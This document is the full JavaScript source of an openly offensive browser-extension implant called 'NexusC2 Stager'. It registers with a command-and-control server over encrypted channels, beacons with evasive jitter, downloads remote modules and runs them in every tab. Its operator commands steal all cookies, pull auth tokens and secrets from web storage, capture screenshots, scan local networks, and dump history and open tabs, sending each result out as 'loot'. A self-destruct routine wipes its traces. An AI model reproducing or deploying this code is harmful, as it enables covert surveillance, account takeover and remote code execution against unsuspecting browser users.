/**
 * ============================================
 * NexusC2 Stager — Minimal Implant Core
 * ============================================
 * 
 * This is the "dumb" stager. It contains ZERO offensive logic.
 * Its only responsibilities are:
 *   1. Generate and persist a unique Bot ID
 *   2. Register with the C2 server (E2E Encrypted over ECDH)
 *   3. Maintain a heartbeat
 *   4. Download and execute modules in memory
 *   5. Poll and execute operator commands
 *   6. Provide a loot submission API for modules
 * 
 * All offensive capabilities are delivered as remote modules.
 * ============================================
 */

// ============================================
// CONFIGURATION — The ONLY thing that changes per deployment
// ============================================
const C2_BASE_URL = "http://localhost:3000"; // Replace with Vercel URL in production
const C2_MASTER_PUBKEY = "MASTER_PUBKEY_PLACEHOLDER"; // Injected by Builder

// ============================================
// STATE
// ============================================
let BOT_ID = null;
let CONFIG = {
    modules_enabled: [],
    beacon_interval_sec: 60,
    kill_switch: false,
};
let LOADED_MODULES = new Set();
let CONTENT_MODULES = new Map(); // Store content scripts to inject into new tabs
let IS_REGISTERED = false;

// Crypto State
let SESSION_KEY = null;
let EPHEMERAL_PUBKEY_B64 = null;

// ============================================
// 0. CRYPTO UTILITIES
// ============================================
function ab2b64(buf) {
    let binary = '';
    const bytes = new Uint8Array(buf);
    for (let i = 0; i < bytes.byteLength; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
}

function b642ab(base64) {
    const binary = atob(base64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
    }
    return bytes.buffer;
}

async function initCrypto() {
    if (SESSION_KEY) return;
    try {
        const kp = await crypto.subtle.generateKey(
            { name: "ECDH", namedCurve: "P-256" },
            true,
            ["deriveKey", "deriveBits"]
        );
        const pubRaw = await crypto.subtle.exportKey("raw", kp.publicKey);
        EPHEMERAL_PUBKEY_B64 = ab2b64(pubRaw);

        let masterPubRaw;
        if (C2_MASTER_PUBKEY === "MASTER_PUBKEY_PLACEHOLDER") {
            // Development fallback if not built by builder - use invalid/dummy key
            masterPubRaw = new Uint8Array(65).buffer;
        } else {
            masterPubRaw = b642ab(C2_MASTER_PUBKEY);
        }

        const masterPubKey = await crypto.subtle.importKey(
            "raw", masterPubRaw, { name: "ECDH", namedCurve: "P-256" }, true, []
        );

        SESSION_KEY = await crypto.subtle.deriveKey(
            { name: "ECDH", public: masterPubKey },
            kp.privateKey,
            { name: "AES-GCM", length: 256 },
            true,
            ["encrypt", "decrypt"]
        );
    } catch (e) { /* init failed */ }
}

async function encryptData(obj) {
    if (!SESSION_KEY) return null;
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const enc = new TextEncoder();
    const data = enc.encode(JSON.stringify(obj));
    const ciphertextBuf = await crypto.subtle.encrypt(
        { name: "AES-GCM", iv },
        SESSION_KEY,
        data
    );
    return { iv: ab2b64(iv.buffer), ciphertext: ab2b64(ciphertextBuf) };
}

async function decryptData(ivB64, ciphertextB64) {
    if (!SESSION_KEY) return null;
    const iv = new Uint8Array(b642ab(ivB64));
    const ciphertext = b642ab(ciphertextB64);
    const plaintextBuf = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv },
        SESSION_KEY,
        ciphertext
    );
    const dec = new TextDecoder();
    return JSON.parse(dec.decode(plaintextBuf));
}

// ============================================
// 1. BOT ID GENERATION & PERSISTENCE
// ============================================
function generateBotId() {
    const bytes = new Uint8Array(16);
    crypto.getRandomValues(bytes);
    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;
    const hex = Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
    return (
        hex.slice(0, 8) + "-" + hex.slice(8, 12) + "-" + hex.slice(12, 16) + "-" +
        hex.slice(16, 20) + "-" + hex.slice(20)
    );
}

async function ensureBotId() {
    return new Promise((resolve) => {
        chrome.storage.local.get(["nexus_bot_id"], (result) => {
            if (result.nexus_bot_id) {
                BOT_ID = result.nexus_bot_id;
            } else {
                BOT_ID = generateBotId();
                chrome.storage.local.set({ nexus_bot_id: BOT_ID });
            }
            resolve(BOT_ID);
        });
    });
}

// ============================================
// 2. FINGERPRINTING (Environment Collection)
// ============================================
function collectFingerprint() {
    const ua = navigator.userAgent;
    let os = "Unknown";
    let browser = "Unknown";

    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac OS")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("CrOS")) os = "ChromeOS";
    else if (ua.includes("Android")) os = "Android";

    if (ua.includes("Edg/")) browser = "Edge";
    else if (ua.includes("Chrome/")) browser = "Chrome";
    else if (ua.includes("Firefox/")) browser = "Firefox";
    else if (ua.includes("Safari/")) browser = "Safari";

    return {
        user_agent: ua,
        os,
        browser,
        hostname: null,
        extension_mask: chrome.runtime.getManifest().name || "Unknown",
    };
}

// ============================================
// 3. C2 COMMUNICATION (E2E Encrypted)
// ============================================
async function c2Fetch(endpoint, data = {}) {
    try {
        await initCrypto();
        const url = `${C2_BASE_URL}/api/bot/${endpoint}`;

        let encPayload = null;
        if (SESSION_KEY) {
            encPayload = await encryptData({ bot_id: BOT_ID, ...data });
        } else {
            return null; // Don't transmit in plaintext if crypto failed
        }

        const response = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-Bot-PubKey": EPHEMERAL_PUBKEY_B64 || ""
            },
            body: JSON.stringify(encPayload),
        });

        if (!response.ok) return null;
        const respBody = await response.json();

        if (respBody.iv && respBody.ciphertext) {
            return await decryptData(respBody.iv, respBody.ciphertext);
        }
        return respBody;
    } catch (e) {
        return null;
    }
}

// ============================================
// 4. REGISTRATION (First Beacon)
// ============================================
async function register() {
    const fingerprint = collectFingerprint();
    const result = await c2Fetch("register", fingerprint);

    if (result && result.status === "registered") {
        IS_REGISTERED = true;
        CONFIG = result.config || CONFIG;
        applyConfig();
        return true;
    }
    return false;
}

// ============================================
// 5. HEARTBEAT (OPSEC-Hardened)
// ============================================
let consecutiveFailures = 0;

async function heartbeat() {
    if (!BOT_ID) return;

    const result = await c2Fetch("heartbeat");
    if (!result) {
        consecutiveFailures++;
        return;
    }

    consecutiveFailures = 0;

    if (result.config) {
        CONFIG = result.config;
        applyConfig();
    }

    if (result.commands && result.commands.length > 0) {
        for (const cmd of result.commands) {
            await executeCommand(cmd);
        }
    }
}

// ============================================
// 6. CONFIGURATION APPLICATION
// ============================================
function applyConfig() {
    if (CONFIG.kill_switch) {
        selfDestruct();
        return;
    }
    loadModules();
}

// ============================================
// 7. MODULE LOADER (In-Memory Execution)
// ============================================
async function loadModules() {
    const enabled = CONFIG.modules_enabled || [];

    for (const moduleName of enabled) {
        if (LOADED_MODULES.has(moduleName)) continue;

        try {
            // Fetch module over encrypted POST channel instead of plaintext GET
            const respBody = await c2Fetch("modules", { name: moduleName });
            if (!respBody || !respBody.code) continue;

            const moduleCode = respBody.code;

            const isContentModule = moduleCode.includes("Runs in: Content script context");

            if (isContentModule) {
                const tabs = await chrome.tabs.query({});
                for (const tab of tabs) {
                    if (tab.url && !tab.url.startsWith("chrome://")) {
                        await executeInTab(tab.id, moduleCode);
                    }
                }
                CONTENT_MODULES.set(moduleName, moduleCode);
            } else {
                const wrappedCode = `
          (function(NexusAPI) {
            'use strict';
            try {
              ${moduleCode}
            } catch(e) {}
          })(self.__NexusAPI);
        `;

                self.__NexusAPI = {
                    botId: BOT_ID,
                    submitLoot,
                    getConfig: () => CONFIG,
                    executeInTab,
                };

                const fn = new Function(wrappedCode);
                fn();
            }

            LOADED_MODULES.add(moduleName);
        } catch (e) { }
    }
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === "complete" && tab.url && !tab.url.startsWith("chrome://")) {
        for (const [moduleName, moduleCode] of CONTENT_MODULES.entries()) {
            if (CONFIG.modules_enabled?.includes(moduleName)) {
                executeInTab(tabId, moduleCode);
            }
        }
    }
});

// ============================================
// 8. LOOT SUBMISSION (API for modules)
// ============================================
async function submitLoot(category, title, content, priority = 1, metadata = {}) {
    return await c2Fetch("loot", { category, title, content, priority, metadata });
}

// Background Listener for Tab Loot (so tabs don't need crypto keys)
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "NEXUS_LOOT") {
        submitLoot(message.category, message.title, message.content, message.priority)
            .then(() => sendResponse({ success: true }))
            .catch(() => sendResponse({ success: false }));
        return true;
    }
});

// ============================================
// 9. CONTENT SCRIPT INJECTION (for tab-level modules)
// ============================================
async function executeInTab(tabId, code) {
    try {
        await chrome.scripting.executeScript({
            target: { tabId },
            func: (moduleCode, extId) => {
                // Bridge API using message passing to background script (E2E enc)
                window.__NexusAPI = {
                    submitLoot: (category, title, content, priority) => {
                        try {
                            chrome.runtime.sendMessage(extId, { type: "NEXUS_LOOT", category, title, content, priority });
                        } catch (e) { }
                    },
                };
                try {
                    const fn = new Function(moduleCode);
                    fn();
                } catch (e) { /* silent */ }
            },
            args: [code, chrome.runtime.id],
            world: "MAIN",
        });
        return true;
    } catch (e) {
        return false;
    }
}

// ============================================
// 10. COMMAND EXECUTION
// ============================================
async function executeCommand(cmd) {
    let result = null;
    let status = "executed";

    try {
        switch (cmd.command_type) {
            case "TRIGGER_SCREENSHOT": {
                const allTabs = await chrome.tabs.query({ active: true });
                const capturableTab = allTabs.find((t) =>
                    t.url && !t.url.startsWith("chrome://") && !t.url.startsWith("devtools://") &&
                    !t.url.startsWith("chrome-extension://") && !t.url.startsWith("about:")
                );
                if (capturableTab) {
                    try {
                        await chrome.windows.update(capturableTab.windowId, { focused: true });
                        const dataUrl = await chrome.tabs.captureVisibleTab(capturableTab.windowId, { format: "png" });
                        if (dataUrl) {
                            await submitLoot("screenshot", `📸 Screenshot: ${capturableTab.title || capturableTab.url}`, dataUrl, 0);
                            result = "Screenshot captured";
                        }
                    } catch (captureErr) {
                        result = `Screenshot capture failed: ${captureErr.message}`;
                        status = "failed";
                    }
                } else {
                    result = "No capturable tab found";
                    status = "failed";
                }
                break;
            }

            case "HARVEST_COOKIES": {
                const cookies = await chrome.cookies.getAll({});
                const formatted = cookies.map((c) => ({
                    domain: c.domain, name: c.name, value: c.value,
                    path: c.path, secure: c.secure, httpOnly: c.httpOnly,
                    expirationDate: c.expirationDate,
                }));
                await submitLoot("cookies", "🍪 Full Cookie Harvest", JSON.stringify(formatted, null, 2), 0);
                result = `${cookies.length} cookies harvested`;
                break;
            }

            case "HARVEST_TOKENS": {
                const tabs = await chrome.tabs.query({});
                for (const tab of tabs) {
                    if (!tab.url || tab.url.startsWith("chrome://")) continue;
                    try {
                        await chrome.scripting.executeScript({
                            target: { tabId: tab.id },
                            func: (extId) => {
                                const tokens = { localStorage: {}, sessionStorage: {} };
                                const patterns = [/token/i, /jwt/i, /auth/i, /api.?key/i, /secret/i, /credential/i, /bearer/i];
                                try {
                                    for (let i = 0; i < localStorage.length; i++) {
                                        const key = localStorage.key(i);
                                        if (patterns.some((p) => p.test(key))) {
                                            tokens.localStorage[key] = localStorage.getItem(key);
                                        }
                                    }
                                    for (let i = 0; i < sessionStorage.length; i++) {
                                        const key = sessionStorage.key(i);
                                        if (patterns.some((p) => p.test(key))) {
                                            tokens.sessionStorage[key] = sessionStorage.getItem(key);
                                        }
                                    }
                                } catch (e) { }
                                const hasTokens = Object.keys(tokens.localStorage).length > 0 || Object.keys(tokens.sessionStorage).length > 0;
                                if (hasTokens) {
                                    try {
                                        chrome.runtime.sendMessage(extId, {
                                            type: "NEXUS_LOOT",
                                            category: "token",
                                            title: `🔑 Token Harvest (${window.location.hostname})`,
                                            content: JSON.stringify(tokens, null, 2),
                                            priority: 0
                                        });
                                    } catch (e) { }
                                }
                            },
                            args: [chrome.runtime.id],
                            world: "MAIN",
                        });
                    } catch (e) { }
                }
                result = "Token harvest dispatched to all tabs";
                break;
            }

            case "SCAN_NETWORK": {
                const ports = [80];
                const subnets = ["192.168.1", "192.168.0", "10.0.0"];
                const findings = [];
                for (const subnet of subnets) {
                    for (let i = 1; i <= 10; i++) {
                        for (const port of ports) {
                            try {
                                const controller = new AbortController();
                                const timeout = setTimeout(() => controller.abort(), 500);
                                await fetch(`http://${subnet}.${i}:${port}`, { signal: controller.signal, mode: "no-cors" });
                                clearTimeout(timeout);
                                findings.push(`[ALIVE] ${subnet}.${i}:${port}`);
                            } catch (e) {
                                if (e.name !== "AbortError") findings.push(`[RESP] ${subnet}.${i}:${port}`);
                            }
                        }
                    }
                }
                if (findings.length > 0) {
                    await submitLoot("network", "🌐 Network Scan Results", findings.join("\n"), 1);
                }
                result = `Scan complete: ${findings.length} hosts found`;
                break;
            }

            case "DUMP_HISTORY": {
                if (chrome.history) {
                    const items = await chrome.history.search({ text: "", maxResults: 100 });
                    const formatted = items.map((i) => `${new Date(i.lastVisitTime).toISOString()} | ${i.url}`).join("\n");
                    await submitLoot("other", "🕘 Browsing History", formatted, 1);
                    result = `${items.length} history entries`;
                } else {
                    result = "History permission not available";
                }
                break;
            }

            case "DUMP_TABS": {
                const tabs = await chrome.tabs.query({});
                const formatted = tabs.map((t) => `[${t.active ? "●" : "○"}] ${t.title} | ${t.url}`).join("\n");
                await submitLoot("other", "🧩 Open Tabs", formatted, 1);
                result = `${tabs.length} tabs`;
                break;
            }

            case "KILL": {
                selfDestruct();
                result = "Kill switch activated";
                break;
            }

            default:
                result = `Unknown command: ${cmd.command_type}`;
                status = "failed";
        }
    } catch (e) {
        result = `Error: ${e.message}`;
        status = "failed";
    }

    // Report result back to C2 (Encrypted via c2Fetch)
    await c2Fetch("commands", { command_id: cmd.id, status, result });
}

// ============================================
// 11. SELF-DESTRUCT
// ============================================
function selfDestruct() {
    chrome.storage.local.clear();
    chrome.alarms.clearAll();
    if (heartbeatTimer) clearTimeout(heartbeatTimer);
    heartbeatTimer = null;
    LOADED_MODULES.clear();
    CONTENT_MODULES.clear();
    IS_REGISTERED = false;
    SESSION_KEY = null;
    CONFIG = { modules_enabled: [], beacon_interval_sec: 60, kill_switch: true };
}

// ============================================
// 12. OPSEC — TIMING UTILITIES
// ============================================
function jitter(baseMs) {
    const variance = baseMs * 0.3;
    return baseMs + (Math.random() * variance * 2 - variance);
}

function getAdaptiveIntervalMs() {
    const hour = new Date().getHours();
    const baseSec = CONFIG.beacon_interval_sec || 60;

    if (hour >= 1 && hour < 6) return jitter(Math.max(baseSec, 180) * 1000);
    if ((hour >= 6 && hour < 9) || (hour >= 22)) return jitter(Math.max(baseSec, 90) * 1000);
    return jitter(baseSec * 1000);
}

// ============================================
// 13. INITIALIZATION (OPSEC-Hardened)
// ============================================
let heartbeatTimer = null;

async function initialize() {
    await ensureBotId();

    const startupDelay = 2000 + Math.random() * 6000;
    await new Promise((r) => setTimeout(r, startupDelay));

    const registered = await register();

    if (registered) {
        scheduleNextHeartbeat();
    } else {
        retryRegistration(30000);
    }
}

function retryRegistration(delayMs) {
    setTimeout(async () => {
        const retried = await register();
        if (retried) {
            scheduleNextHeartbeat();
        } else {
            retryRegistration(Math.min(delayMs * 2, 300000));
        }
    }, jitter(delayMs));
}

function scheduleNextHeartbeat() {
    if (heartbeatTimer) clearTimeout(heartbeatTimer);

    let intervalMs = getAdaptiveIntervalMs();
    if (consecutiveFailures > 0) {
        const backoff = Math.min(consecutiveFailures * 30000, 600000);
        intervalMs += backoff;
    }

    heartbeatTimer = setTimeout(async () => {
        await heartbeat();
        scheduleNextHeartbeat();
    }, intervalMs);
}

chrome.alarms.create("nx_sync", { periodInMinutes: 2 });
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "nx_sync" && !heartbeatTimer) {
        scheduleNextHeartbeat();
    }
});

try {
    chrome.idle.onStateChanged.addListener((newState) => {
        if (newState === "locked" || newState === "idle") {
            if (heartbeatTimer) clearTimeout(heartbeatTimer);
            heartbeatTimer = null;
        } else if (newState === "active") {
            if (!heartbeatTimer) scheduleNextHeartbeat();
        }
    });
    chrome.idle.setDetectionInterval(120);
} catch (e) { }

// Lifecycle events
chrome.runtime.onInstalled.addListener(() => initialize());
chrome.runtime.onStartup.addListener(() => initialize());
initialize();
